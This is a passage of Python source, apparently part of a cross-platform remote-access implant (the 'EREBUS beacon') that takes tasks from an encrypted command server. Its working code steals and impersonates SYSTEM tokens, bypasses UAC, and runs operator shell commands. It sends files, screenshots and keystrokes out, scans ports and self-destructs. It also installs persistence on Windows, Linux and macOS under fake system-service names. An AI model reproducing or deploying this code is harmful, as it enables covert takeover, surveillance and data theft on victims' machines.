                                cls._k32().CloseHandle(h_tok)
                                cls._k32().CloseHandle(h_proc)
                                cls._k32().CloseHandle(snap)
                                return h_dup.value
                        cls._k32().CloseHandle(h_proc)
                if not cls._k32().Process32Next(snap, ctypes.byref(pe)):
                    break
            cls._k32().CloseHandle(snap)
        except Exception:
            pass
        return None

    @classmethod
    def impersonate_system(cls) -> Tuple[bool, str]:
        if not _IS_WINDOWS:
            return False, "Windows only"
        tok = cls.get_system_token()
        if tok is None:
            return False, "failed to obtain SYSTEM token (try with Admin privileges)"
        try:
            if cls._adv().ImpersonateLoggedOnUser(ctypes.c_void_p(tok)):
                cls._k32().CloseHandle(ctypes.c_void_p(tok))
                return True, "impersonating SYSTEM"
            cls._k32().CloseHandle(ctypes.c_void_p(tok))
            return False, f"ImpersonateLoggedOnUser failed (error {cls._k32().GetLastError()})"
        except Exception as exc:
            return False, str(exc)

    @classmethod
    def impersonate_pid(cls, pid: int) -> Tuple[bool, str]:
        if not _IS_WINDOWS:
            return False, "Windows only"
        cls.enable_privilege(cls.SE_DEBUG_NAME)
        try:
            h_proc = cls._k32().OpenProcess(
                cls.PROCESS_QUERY_INFORMATION, False, pid
            )
            if not h_proc:
                return False, f"OpenProcess({pid}) failed"
            h_tok = ctypes.c_void_p()
            if not cls._adv().OpenProcessToken(
                h_proc,
                cls.TOKEN_DUPLICATE | cls.TOKEN_QUERY,
                ctypes.byref(h_tok)
            ):
                cls._k32().CloseHandle(h_proc)
                return False, "OpenProcessToken failed"
            h_dup = ctypes.c_void_p()
            cls._adv().DuplicateTokenEx(
                h_tok, cls.TOKEN_ALL_ACCESS, None,
                cls.SecurityImpersonation, cls.TokenImpersonation,
                ctypes.byref(h_dup)
            )
            cls._k32().CloseHandle(h_tok)
            cls._k32().CloseHandle(h_proc)
            if cls._adv().ImpersonateLoggedOnUser(h_dup):
                cls._k32().CloseHandle(h_dup)
                return True, f"impersonating pid {pid}"
            cls._k32().CloseHandle(h_dup)
            return False, "ImpersonateLoggedOnUser failed"
        except Exception as exc:
            return False, str(exc)

    @classmethod
    def revert(cls) -> str:
        if not _IS_WINDOWS:
            return "Windows only"
        try:
            cls._adv().RevertToSelf()
            return "reverted to original token"
        except Exception as exc:
            return f"revert failed: {exc}"

    @classmethod
    def list_tokens(cls) -> List[Dict]:
        """Enumerate processes and their token user (where accessible)."""
        if not _IS_WINDOWS or not _HAS_PSUTIL:
            return []
        result: List[Dict] = []
        cls.enable_privilege(cls.SE_DEBUG_NAME)
        for p in _psutil.process_iter(["pid", "name", "username", "status"]):
            try:
                info = p.info
                if info.get("username"):
                    result.append({
                        "pid":  info["pid"],
                        "name": info.get("name", ""),
                        "user": info["username"],
                    })
            except (_psutil.NoSuchProcess, _psutil.AccessDenied):
                pass
        return result


# ---------------------------------------------------------------------------
# Windows UAC bypass
# ---------------------------------------------------------------------------

class _UACBypass:
    """
    UAC bypass techniques for Windows.
    All require the current process to be medium-integrity (standard user).
    """

    @staticmethod
    def fodhelper(command: str) -> Tuple[bool, str]:
        """
        fodhelper.exe bypass — effective on most Windows 10 builds.
        Creates a temporary registry key, triggers fodhelper, cleans up.
        """
        if not _IS_WINDOWS:
            return False, "Windows only"
        try:
            import winreg
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "",               0, winreg.REG_SZ, command)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            subprocess.Popen(
                r"C:\Windows\System32\fodhelper.exe",
                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
            )
            time.sleep(2)
            winreg.DeleteKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Classes\ms-settings\Shell\Open\command"
            )
            return True, "fodhelper bypass executed"
        except Exception as exc:
            return False, f"fodhelper bypass failed: {exc}"

    @staticmethod
    def sdclt(command: str) -> Tuple[bool, str]:
        """
        sdclt.exe bypass — alternative technique for Windows 10.
        Uses the App Paths handler via HKCU for auto-elevation.
        """
        if not _IS_WINDOWS:
            return False, "Windows only"
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            subprocess.Popen(
                r"C:\Windows\System32\sdclt.exe",
                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
            )
            time.sleep(2)
            winreg.DeleteKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
            )
            return True, "sdclt bypass executed"
        except Exception as exc:
            return False, f"sdclt bypass failed: {exc}"


# ---------------------------------------------------------------------------
# Task handlers
# ---------------------------------------------------------------------------

class TaskHandlers:
    """
    One handler per TaskType, plus internal '!' commands routed through shell.

    Internal commands (prefix '!', do not require server changes):
      !help
      !impersonate:<pid>      (Windows)
      !impersonate:system     (Windows)
      !token:revert           (Windows)
      !token:list             (Windows)
      !uac:fodhelper <cmd>    (Windows)
      !uac:sdclt <cmd>        (Windows)
      !persist:install
      !persist:remove
      !evasion:check
      !sysinfo
    """

    def __init__(self, agent: "Agent") -> None:
        self._a = agent

    # ── SHELL ───────────────────────────────────────────────────────────────

    def shell(self, task: Dict) -> TaskResult:
        cmd = task["command"].strip()
        if not cmd:
            return TaskResult(task["task_id"], "empty command", False)
        if cmd.startswith("!"):
            return self._internal(task, cmd)
        timeout = self._a.cfg.task_timeout
        try:
            args = (["cmd.exe", "/c", cmd] if _IS_WINDOWS
                    else ["/bin/sh", "-c", cmd])
            proc = subprocess.Popen(
                args,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                env=os.environ.copy(),
            )
            try:
                stdout, stderr = proc.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.kill(); proc.communicate()
                return TaskResult(task["task_id"],
                                  f"timed out after {timeout}s", False)
            out = stdout.decode(errors="replace")
            if stderr:
                out += "\n--- STDERR ---\n" + stderr.decode(errors="replace")
            raw = out.encode()
            if len(raw) > _MAX_OUTPUT_BYTES:
                out = raw[:_MAX_OUTPUT_BYTES].decode(errors="replace")
                out += f"\n[...truncated at {_MAX_OUTPUT_BYTES // 1024} KB]"
            return TaskResult(task["task_id"], out.strip() or "(no output)", True)
        except Exception as exc:
            return TaskResult(task["task_id"], f"shell error: {exc}", False)

    def _internal(self, task: Dict, cmd: str) -> TaskResult:
        tid = task["task_id"]
        parts = cmd[1:].split(None, 1)
        verb  = parts[0].lower()
        rest  = parts[1] if len(parts) > 1 else ""

        if verb == "help":
            return TaskResult(tid, "\n".join([
                "Internal commands:",
                "  !impersonate:<pid>      impersonate process token (Windows)",
                "  !impersonate:system     impersonate SYSTEM token (Windows)",
                "  !token:revert           revert to original token (Windows)",
                "  !token:list             list process tokens (Windows)",
                "  !uac:fodhelper <cmd>    UAC bypass via fodhelper (Windows)",
                "  !uac:sdclt <cmd>        UAC bypass via sdclt (Windows)",
                "  !persist:install        install persistence",
                "  !persist:remove         remove persistence",
                "  !evasion:check          run anti-analysis scan",
                "  !sysinfo                dump extended system info",
            ]), True)

        if verb.startswith("impersonate:"):
            target = verb.split(":", 1)[1]
            if target == "system":
                ok, msg = _WinToken.impersonate_system()
            else:
                try:    pid_int = int(target)
                except ValueError:
                    return TaskResult(tid, f"!impersonate: invalid pid {target!r}", False)
                ok, msg = _WinToken.impersonate_pid(pid_int)
            return TaskResult(tid, msg, ok)

        if verb == "token:revert":
            return TaskResult(tid, _WinToken.revert(), True)

        if verb == "token:list":
            tokens = _WinToken.list_tokens()
            return TaskResult(tid, json.dumps(tokens), True)

        if verb.startswith("uac:"):
            method = verb.split(":", 1)[1]
            if not rest:
                return TaskResult(tid, f"!uac:{method}: command required", False)
            if method == "fodhelper":
                ok, msg = _UACBypass.fodhelper(rest)
            elif method == "sdclt":
                ok, msg = _UACBypass.sdclt(rest)
            else:
                return TaskResult(tid, f"unknown UAC method {method!r}", False)
            return TaskResult(tid, msg, ok)

        if verb == "persist:install":
            msg = _PersistenceManager.install()
            return TaskResult(tid, msg, True)

        if verb == "persist:remove":
            _PersistenceManager.remove()
            return TaskResult(tid, "persistence removed", True)

        if verb == "evasion:check":
            report = _AntiAnalysis.check()
            return TaskResult(
                tid,
                f"suspicious={report.suspicious()}\n{report.summary()}",
                True,
            )

        if verb == "sysinfo":
            info = SysInfo.collect()
            return TaskResult(tid, json.dumps(info, indent=2), True)

        return TaskResult(tid, f"unknown internal command: {cmd!r}", False)

    # ── DOWNLOAD (agent → operator) ─────────────────────────────────────────

    def download(self, task: Dict) -> TaskResult:
        path = task["command"]
        try:
            size = os.path.getsize(path)
        except OSError as exc:
            return TaskResult(task["task_id"], f"download error: {exc}", False)
        if size > _MAX_DOWNLOAD_BYTES:
            return TaskResult(task["task_id"],
                              f"file too large: {size:,} bytes", False)
        try:
            chunks: List[bytes] = []
            with open(path, "rb") as fh:
                while chunk := fh.read(65536):
                    chunks.append(chunk)
            data = b"".join(chunks)
            return TaskResult(task["task_id"], json.dumps({
                "path": path, "size_bytes": len(data),
                "data": base64.b64encode(data).decode(),
            }), True)
        except Exception as exc:
            return TaskResult(task["task_id"], f"download error: {exc}", False)

    # ── UPLOAD (operator → agent) ───────────────────────────────────────────

    def upload(self, task: Dict) -> TaskResult:
        path = task["command"]
        b64  = task.get("args", {}).get("data", "")
        if not b64:
            return TaskResult(task["task_id"], "args.data required", False)
        try:
            data = base64.b64decode(b64)
        except Exception:
            return TaskResult(task["task_id"], "args.data: invalid base64", False)
        if len(data) > _MAX_UPLOAD_BYTES:
            return TaskResult(task["task_id"],
                              f"upload too large: {len(data):,} bytes", False)
        try:
            parent = os.path.dirname(os.path.abspath(path))
            if parent:
                os.makedirs(parent, exist_ok=True)
            with open(path, "wb") as fh:
                fh.write(data)
            return TaskResult(task["task_id"],
                              f"wrote {len(data):,} bytes → {path}", True)
        except Exception as exc:
            return TaskResult(task["task_id"], f"upload error: {exc}", False)

    # ── PROC_LIST ───────────────────────────────────────────────────────────

    def proc_list(self, task: Dict) -> TaskResult:
        try:
            procs: List[Dict] = []
            if _HAS_PSUTIL:
                for p in _psutil.process_iter(
                    ["pid", "name", "username", "status",
                     "cpu_percent", "memory_info"]
                ):
                    try:
                        i = p.info
                        procs.append({
                            "pid":    i["pid"],
                            "name":   i.get("name", ""),
                            "user":   i.get("username", ""),
                            "status": i.get("status", ""),
                            "cpu":    i.get("cpu_percent", 0),
                            "mem_kb": (i["memory_info"].rss // 1024
                                       if i.get("memory_info") else 0),
                        })
                    except (_psutil.NoSuchProcess, _psutil.AccessDenied):
                        pass
            elif _IS_WINDOWS:
                raw = subprocess.check_output(
                    ["tasklist", "/fo", "csv", "/nh"],
                    stderr=subprocess.DEVNULL, timeout=15,
                ).decode(errors="ignore")
                for line in raw.strip().splitlines():
                    parts = [x.strip('"') for x in line.split('","')]
                    if len(parts) >= 2:
                        procs.append({"name": parts[0], "pid": parts[1]})
            else:
                raw = subprocess.check_output(
                    ["ps", "aux"], stderr=subprocess.DEVNULL, timeout=15,
                ).decode(errors="ignore")
                for line in raw.strip().splitlines()[1:]:
                    cols = line.split(None, 10)
                    if len(cols) >= 2:
                        procs.append({"user": cols[0], "pid": cols[1],
                                      "name": cols[-1][:60]})
            return TaskResult(task["task_id"], json.dumps(procs), True)
        except Exception as exc:
            return TaskResult(task["task_id"], f"proc_list error: {exc}", False)

    # ── FILE_LIST ───────────────────────────────────────────────────────────

    def file_list(self, task: Dict) -> TaskResult:
        target = task["command"] or "."
        try:
            entries: List[Dict] = []
            with os.scandir(target) as it:
                for e in it:
                    try:
                        st = e.stat()
                        entries.append({
                            "name":     e.name,
                            "type":     "dir" if e.is_dir() else "file",
                            "size":     st.st_size,
                            "modified": time.strftime(
                                "%Y-%m-%dT%H:%M:%SZ", time.gmtime(st.st_mtime)
                            ),
                        })
                    except PermissionError:
                        entries.append({"name": e.name, "type": "?",
                                        "size": 0, "modified": ""})
            entries.sort(key=lambda x: (x["type"] != "dir", x["name"].lower()))
            return TaskResult(task["task_id"], json.dumps(entries), True)
        except Exception as exc:
            return TaskResult(task["task_id"], f"file_list error: {exc}", False)

    # ── PORT_SCAN ───────────────────────────────────────────────────────────

    def port_scan(self, task: Dict) -> TaskResult:
        host    = task["command"]
        args    = task.get("args", {})
        timeout = float(args.get("timeout", 1.0))
        raw_ports = str(args.get(
            "ports",
            "21,22,23,25,53,80,110,135,139,143,443,445,993,995,"
            "1433,1723,3306,3389,5432,5900,6379,8080,8443,27017",
        ))
        ports: List[int] = []
        for part in raw_ports.split(","):
            part = part.strip()
            if "-" in part:
                try:
                    lo, hi = part.split("-", 1)
                    ports.extend(range(int(lo), min(int(hi) + 1, 65536)))
                except ValueError:
                    pass
            else:
                try:    ports.append(int(part))
                except ValueError: pass
        ports = sorted({p for p in ports if 1 <= p <= 65535})
        SERVICES = {
            21:"ftp", 22:"ssh", 23:"telnet", 25:"smtp", 53:"dns",
            80:"http", 110:"pop3", 135:"msrpc", 139:"netbios", 143:"imap",
            443:"https", 445:"smb", 993:"imaps", 995:"pop3s",
            1433:"mssql", 1723:"pptp", 3306:"mysql", 3389:"rdp",
            5432:"postgres", 5900:"vnc", 6379:"redis",
            8080:"http-alt", 8443:"https-alt", 27017:"mongodb",
        }
        def probe(port: int) -> Optional[Dict]:
            try:
                with socket.create_connection((host, port), timeout=timeout):
                    return {"port": port, "state": "open",
                            "service": SERVICES.get(port, "unknown")}
            except Exception:
                return None
        open_ports: List[Dict] = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=128) as ex:
            for fut in concurrent.futures.as_completed(
                {ex.submit(probe, p): p for p in ports}
            ):
                r = fut.result()
                if r: open_ports.append(r)
        open_ports.sort(key=lambda x: x["port"])
        return TaskResult(task["task_id"],
                          json.dumps({"host": host, "scanned": len(ports),
                                      "open": open_ports}), True)

    # ── SCREENSHOT ──────────────────────────────────────────────────────────

    def screenshot(self, task: Dict) -> TaskResult:
        if _HAS_PIL:
            try:
                img = _ImageGrab.grab()
                buf = io.BytesIO()
                img.save(buf, format="PNG", optimize=True)
                return TaskResult(task["task_id"], json.dumps({
                    "format": "png", "width": img.width, "height": img.height,
                    "data": base64.b64encode(buf.getvalue()).decode(),
                }), True)
            except Exception as exc:
                return TaskResult(task["task_id"], f"screenshot error: {exc}", False)
        if _IS_WINDOWS:
            return self._screenshot_win32(task)
        return TaskResult(task["task_id"],
                          "screenshot unavailable (install Pillow)", False)

    def _screenshot_win32(self, task: Dict) -> TaskResult:
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as _f:
            tmp = _f.name
        try:
            ps = (
                "Add-Type -Assembly System.Windows.Forms,System.Drawing; "
                "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
                "$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height); "
                "$g=[System.Drawing.Graphics]::FromImage($b); "
                "$g.CopyFromScreen(0,0,0,0,$s.Size); "
                f"$b.Save('{tmp}');"
            )
            subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
                capture_output=True, timeout=20,
            )
            with open(tmp, "rb") as fh:
                enc = base64.b64encode(fh.read()).decode()
            return TaskResult(task["task_id"],
                              json.dumps({"format": "png", "data": enc}), True)
        except Exception as exc:
            return TaskResult(task["task_id"],
                              f"screenshot (win32) error: {exc}", False)
        finally:
            try: os.unlink(tmp)
            except OSError: pass

    # ── KEYLOG ──────────────────────────────────────────────────────────────

    def keylog_start(self, task: Dict) -> TaskResult:
        msg = self._a._keylog.start()
        return TaskResult(task["task_id"], msg,
                          "failed" not in msg and "unavailable" not in msg)

    def keylog_stop(self, task: Dict) -> TaskResult:
        return TaskResult(task["task_id"], self._a._keylog.stop(), True)

    # ── SLEEP ───────────────────────────────────────────────────────────────

    def sleep(self, task: Dict) -> TaskResult:
        args = task.get("args", {})
        try:
            if "min" in args or "max" in args:
                mn = int(args.get("min", self._a.cfg.sleep_min))
                mx = int(args.get("max", self._a.cfg.sleep_max))
            else:
                v  = int(task["command"])
                mn = mx = max(1, v)
            mn = max(1, mn); mx = max(mn, mx)
            self._a.cfg.sleep_min = mn
            self._a.cfg.sleep_max = mx
            return TaskResult(task["task_id"],
                              f"beacon interval → {mn}–{mx}s", True)
        except Exception as exc:
            return TaskResult(task["task_id"], f"sleep error: {exc}", False)

    # ── SELFDESTRUCT ────────────────────────────────────────────────────────

    def selfdestruct(self, task: Dict) -> TaskResult:
        if task.get("command", "").lower() != "selfdestruct":
            return TaskResult(task["task_id"],
                              "selfdestruct requires command='selfdestruct'", False)
        self._a._keylog.stop()
        _PersistenceManager.remove()
        self._a._signal_stop()
        script = os.path.abspath(sys.argv[0])
        if _IS_WINDOWS:
            subprocess.Popen(
                f'cmd /c ping -n 3 127.0.0.1 >nul && del /f /q "{script}"',
                shell=True,
                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
            )
        else:
            subprocess.Popen(f'sleep 3 && rm -f "{script}"',
                             shell=True, start_new_session=True)
        return TaskResult(task["task_id"], "self-destruct initiated", True)

    # ── DISPATCH ────────────────────────────────────────────────────────────

    def dispatch(self, task: Dict) -> TaskResult:
        err = _validate_task(task)
        if err:
            tid = task.get("task_id", "unknown") if isinstance(task, dict) else "unknown"
            return TaskResult(str(tid), f"validation failed: {err}", False)
        try:
            return getattr(self, task["type"])(task)
        except Exception as exc:
            return TaskResult(task["task_id"],
                              f"unhandled exception in {task['type']}: {exc}", False)


# ---------------------------------------------------------------------------
# Persistence manager (multi-vector)
# ---------------------------------------------------------------------------

class _PersistenceManager:
    """
    Installation order:
      Windows: (1) Scheduled Task  (2) HKCU Run registry  (3) Startup folder
      Linux:   (1) systemd user unit  (2) ~/.bashrc  (3) crontab
      macOS:   (1) LaunchAgent plist  (2) crontab
    All methods are idempotent and silent on failure.
    """

    _REG_KEY  = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    _REG_NAME = "MicrosoftTelemetryHelper"
    _TASK_NAME = r"Microsoft\Windows\WindowsUpdate\TelemetryService"
    _LAUNCHAGENT = "com.apple.useragentd.plist"

    @classmethod
    def install(cls) -> str:
        script = os.path.abspath(sys.argv[0])
        exe    = sys.executable
        results: List[str] = []

        if _IS_WINDOWS:
            results.append(cls._win_schtask(exe, script))
            results.append(cls._win_registry(exe, script))
            results.append(cls._win_startup(exe, script))
        elif _IS_LINUX:
            results.append(cls._lin_systemd(exe, script))
            results.append(cls._lin_bashrc(exe, script))
            results.append(cls._lin_crontab(exe, script))
        elif _IS_MACOS:
            results.append(cls._mac_launchagent(exe, script))
            results.append(cls._lin_crontab(exe, script))

        return "; ".join(r for r in results if r)

    @classmethod
    def remove(cls) -> None:
        script = os.path.abspath(sys.argv[0])
        if _IS_WINDOWS:
            cls._win_schtask_remove()
            cls._win_registry_remove()
        elif _IS_LINUX:
            cls._lin_systemd_remove()
            cls._lin_bashrc_remove(script)
            cls._lin_crontab_remove(script)
        elif _IS_MACOS:
            cls._mac_launchagent_remove()
            cls._lin_crontab_remove(script)

    # Windows ----------------------------------------------------------------

    @classmethod
    def _win_schtask(cls, exe: str, script: str) -> str:
        try:
            cmd = (
                f'schtasks /create /f /tn "{cls._TASK_NAME}" '
                f'/tr "\\"{exe}\\" \\"{script}\\"" '
                '/sc onlogon /rl highest'
            )
            subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
            return f"schtask: {cls._TASK_NAME}"
        except Exception as exc:
            return f"schtask failed: {exc}"

    @classmethod
    def _win_schtask_remove(cls) -> None:
        try:
            subprocess.run(
                f'schtasks /delete /f /tn "{cls._TASK_NAME}"',
                shell=True, capture_output=True, timeout=10,
            )
        except Exception:
            pass

    @classmethod
    def _win_registry(cls, exe: str, script: str) -> str:
        try:
            cmd = (
                f'reg add "{cls._REG_KEY}" /v "{cls._REG_NAME}" /t REG_SZ '
                f'/d "\\"{exe}\\" \\"{script}\\"" /f'
            )
            subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
            return f"registry: {cls._REG_NAME}"
        except Exception as exc:
            return f"registry failed: {exc}"

    @classmethod
    def _win_registry_remove(cls) -> None:
        try:
            subprocess.run(
                f'reg delete "{cls._REG_KEY}" /v "{cls._REG_NAME}" /f',
                shell=True, capture_output=True, timeout=10,
            )
        except Exception:
            pass

    @classmethod
    def _win_startup(cls, exe: str, script: str) -> str:
        try:
            startup = os.path.join(
                os.environ.get("APPDATA", ""),
                r"Microsoft\Windows\Start Menu\Programs\Startup",
                "MicrosoftHelper.bat",
            )
            with open(startup, "w") as fh:
                fh.write(f'@echo off\nstart "" "{exe}" "{script}"\n')
            return f"startup folder: {startup}"
        except Exception as exc:
            return f"startup folder failed: {exc}"

    # Linux ------------------------------------------------------------------

    @classmethod
    def _lin_systemd(cls, exe: str, script: str) -> str:
        try:
            unit_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(unit_dir, exist_ok=True)
            unit = os.path.join(unit_dir, "dbus-helper.service")
            with open(unit, "w") as fh:
                fh.write(f"[Unit]\nDescription=D-Bus Session Helper\n\n"
                         f"[Service]\nExecStart={exe} {script}\nRestart=always\n"
                         f"RestartSec=60\n\n[Install]\nWantedBy=default.target\n")
            subprocess.run(
                ["systemctl", "--user", "enable", "--now", "dbus-helper.service"],
                capture_output=True, timeout=5,
            )
            return "systemd user service: dbus-helper"
        except Exception as exc:
            return f"systemd failed: {exc}"

    @classmethod
    def _lin_systemd_remove(cls) -> None:
        try:
            subprocess.run(
                ["systemctl", "--user", "disable", "--now", "dbus-helper.service"],
                capture_output=True, timeout=5,
            )
            unit = os.path.expanduser("~/.config/systemd/user/dbus-helper.service")
            if os.path.exists(unit):
                os.unlink(unit)
        except Exception:
            pass

    @classmethod
    def _lin_bashrc(cls, exe: str, script: str) -> str:
        try:
            for rc in ("~/.bashrc", "~/.profile", "~/.zshrc"):
                path = os.path.expanduser(rc)
                if os.path.exists(path):
                    marker = f"# sysmon-{hashlib.md5(script.encode()).hexdigest()[:8]}"
                    with open(path) as fh:
                        content = fh.read()
                    if marker not in content:
                        with open(path, "a") as fh:
                            fh.write(
                                f"\n{marker}\n"
                                f"( {exe} {script} & ) 2>/dev/null\n"
                            )
            return "bashrc/profile"
        except Exception as exc:
            return f"bashrc failed: {exc}"

    @classmethod
    def _lin_bashrc_remove(cls, script: str) -> None:
        marker = f"# sysmon-{hashlib.md5(script.encode()).hexdigest()[:8]}"
        for rc in ("~/.bashrc", "~/.profile", "~/.zshrc"):
            path = os.path.expanduser(rc)
            if not os.path.exists(path):
                continue
            try:
                with open(path) as fh:
                    lines = fh.readlines()
                skip_next = False
                new_lines = []
                for line in lines:
                    if marker in line:
                        skip_next = True; continue
                    if skip_next:
                        skip_next = False; continue
                    new_lines.append(line)
                with open(path, "w") as fh:
                    fh.writelines(new_lines)
            except Exception:
                pass

    @classmethod
    def _lin_crontab(cls, exe: str, script: str) -> str:
        try:
            entry = f"@reboot {exe} {script}\n"
            try:
                cur = subprocess.check_output(
                    ["crontab", "-l"], stderr=subprocess.DEVNULL, timeout=5,
                ).decode(errors="ignore")
            except subprocess.CalledProcessError:
                cur = ""
            if entry not in cur:
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
                proc.communicate((cur + entry).encode())
            return "crontab @reboot"
        except Exception as exc:
            return f"crontab failed: {exc}"

    @classmethod
    def _lin_crontab_remove(cls, script: str) -> None:
        try:
            try:
                cur = subprocess.check_output(
                    ["crontab", "-l"], stderr=subprocess.DEVNULL, timeout=5,
                ).decode(errors="ignore")
            except subprocess.CalledProcessError:
                return
            new = "\n".join(l for l in cur.splitlines()
                            if script not in l) + "\n"
            proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
            proc.communicate(new.encode())
        except Exception:
            pass

    # macOS ------------------------------------------------------------------

    @classmethod
    def _mac_launchagent(cls, exe: str, script: str) -> str:
        try:
            la_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(la_dir, exist_ok=True)
            plist  = os.path.join(la_dir, cls._LAUNCHAGENT)
            content = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
                '<plist version="1.0"><dict>\n'
                f'  <key>Label</key><string>{cls._LAUNCHAGENT}</string>\n'
                f'  <key>ProgramArguments</key>'
                f'<array><string>{exe}</string>'
                f'<string>{script}</string></array>\n'
                '  <key>RunAtLoad</key><true/>\n'
                '  <key>KeepAlive</key><true/>\n'
                '</dict></plist>\n'
            )
            with open(plist, "w") as fh:
                fh.write(content)
            subprocess.run(
                ["launchctl", "load", plist],
                capture_output=True, timeout=5,
            )
            return f"LaunchAgent: {cls._LAUNCHAGENT}"
        except Exception as exc:
            return f"LaunchAgent failed: {exc}"

    @classmethod
    def _mac_launchagent_remove(cls) -> None:
        plist = os.path.expanduser(
            f"~/Library/LaunchAgents/{cls._LAUNCHAGENT}"
        )
        try:
            subprocess.run(["launchctl", "unload", plist],
                           capture_output=True, timeout=5)
            if os.path.exists(plist):
                os.unlink(plist)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Agent
# ---------------------------------------------------------------------------

class Agent:
    """
    Cross-platform EREBUS beacon.

    Startup sequence:
      1. _validate_config()        — reject zero/missing master key
      2. _ProcessCamouflage.apply() — rename process
      3. evasion check             — VM/sandbox/debugger detection
      4. SysInfo.collect()         — extended recon
      5. _register()               — master key → per-agent AES-256 key
      6. Background threads:        heartbeat, result sender
      7. Beacon loop:               jitter sleep → /a/in → thread pool
    """

    def __init__(self, cfg: Optional[BeaconConfig] = None) -> None:
        self.cfg = cfg or BeaconConfig()
        self._validate_config()

        self._crypto    = CryptoLayer()
        self._transport = Transport(self.cfg)
        self._sysinfo   = SysInfo.collect()
        self._keylog    = KeylogBuffer()
        self._handlers  = TaskHandlers(self)
        self._rq        = ResultQueue()

        raw_mk = bytes.fromhex(self.cfg.master_key_hex)
        self._master_key = _SecureKey(raw_mk)
        self._agent_key: Optional[_SecureKey] = None

        self._running    = True
        self._stop_event = threading.Event()

    # ── Config validation ───────────────────────────────────────────────────

    def _validate_config(self) -> None:
        if not self.cfg.master_key_hex:
            raise ValueError("master_key_hex is empty")
        try:
            raw = bytes.fromhex(self.cfg.master_key_hex)
        except ValueError as exc:
            raise ValueError(f"master_key_hex is not valid hex: {exc}") from exc
        if len(raw) != 32:
            raise ValueError(f"master_key_hex must be 32 bytes, got {len(raw)}")
        if raw == bytes(32):
            raise ValueError(
                "master_key_hex is the all-zero placeholder — "
                "embed the real key from the teamserver"
            )

    # ── Internals ───────────────────────────────────────────────────────────

    def _signal_stop(self) -> None:
        self._running = False
        self._stop_event.set()

    def _sleep_jitter(self) -> None:
        # Use a normal-distribution-like sleep for more natural beacon timing
        base  = (self.cfg.sleep_min + self.cfg.sleep_max) / 2.0
        sigma = (self.cfg.sleep_max - self.cfg.sleep_min) / 4.0
        delay = max(self.cfg.sleep_min,
                    min(self.cfg.sleep_max,
                        random.gauss(base, sigma)))
        self._stop_event.wait(delay)

    # ── Registration ────────────────────────────────────────────────────────

    def _register(self) -> bool:
        mk      = self._master_key.get()
        payload = self._transport._pad(self._sysinfo)
        frame   = self._crypto.pack(json.dumps(payload).encode(), mk)
        raw     = self._transport.post_raw("/a/reg", frame, retries=5, backoff=10.0)
        if not raw:
            return False
        try:
            resp = json.loads(self._crypto.unpack(raw, mk))
            if resp.get("status") != "ok":
                return False
            key_bytes = bytes.fromhex(resp["agent_key"])
            if len(key_bytes) != 32:
                return False
            if self._agent_key:
                self._agent_key.clear()
            self._agent_key = _SecureKey(key_bytes)
            return True
        except Exception:
            return False

    # ── Check-in ────────────────────────────────────────────────────────────

    def _checkin(self) -> List[Dict]:
        assert self._agent_key is not None
        ak      = self._agent_key.get()
        payload = self._transport._pad({"agent_id": self._sysinfo["agent_id"]})
        raw     = self._transport.post_raw(
            "/a/in", self._crypto.pack(json.dumps(payload).encode(), ak)
        )
        if not raw:
            return []
        try:
            resp  = json.loads(self._crypto.unpack(raw, ak))
            tasks = resp.get("tasks", [])
            return tasks if isinstance(tasks, list) else []
        except Exception:
            return []

    # ── Result posting ──────────────────────────────────────────────────────

    def _try_post_result(self, result: TaskResult) -> bool:
        assert self._agent_key is not None
        ak      = self._agent_key.get()
        payload = self._transport._pad({
            "agent_id": self._sysinfo["agent_id"],
            "task_id":  result.task_id,
            "output":   result.output,
            "success":  result.success,
        })
        return self._transport.post_raw(
            "/a/out", self._crypto.pack(json.dumps(payload).encode(), ak)
        ) is not None

    # ── Background: result sender ───────────────────────────────────────────

    def _result_sender_loop(self) -> None:
        backoff = 5.0
        while self._running or len(self._rq) > 0:
            self._rq.wait(min(backoff, 30.0))
            batch = self._rq.drain(16)
            if not batch:
                backoff = 5.0; continue
            failed: List[TaskResult] = []
            for result in batch:
                if not self._try_post_result(result):
                    failed.append(result)
            if failed:
                self._rq.requeue(failed)
                backoff = min(backoff * 1.5, 120.0)
            else:
                backoff = 5.0

    # ── Background: heartbeat ───────────────────────────────────────────────

    def _heartbeat_loop(self) -> None:
        while self._running:
            self._stop_event.wait(self.cfg.hb_interval)
            if not self._running:
                break
            if self._agent_key:
                try:
                    ak      = self._agent_key.get()
                    payload = self._transport._pad(
                        {"agent_id": self._sysinfo["agent_id"]}
                    )
                    self._transport.post_raw(
                        "/a/hb",
                        self._crypto.pack(json.dumps(payload).encode(), ak),
                        retries=1,
                    )
                except Exception:
